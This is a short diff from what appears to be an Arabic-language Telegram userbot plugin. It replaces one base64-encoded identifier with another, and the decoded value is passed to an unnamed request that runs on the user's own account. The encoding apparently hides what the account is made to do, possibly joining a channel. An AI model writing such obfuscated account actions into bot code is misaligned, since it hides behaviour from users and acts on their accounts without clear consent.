@@ -90,7 +90,7 @@ async def _(event):
         except YouBlockedUserError:
             await event.edit("**⎉╎ الغـي حـظر هـذا البـوت و حـاول مجـددا @msaver_bot**")
             return
-        REPTHON = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+        REPTHON = base64.b64decode("YnkzbDNyZXB0aG9uZG93bmxvYWQ=")
         TAIBA = Get(REPTHON)
         try:
             await event.client(TAIBA)
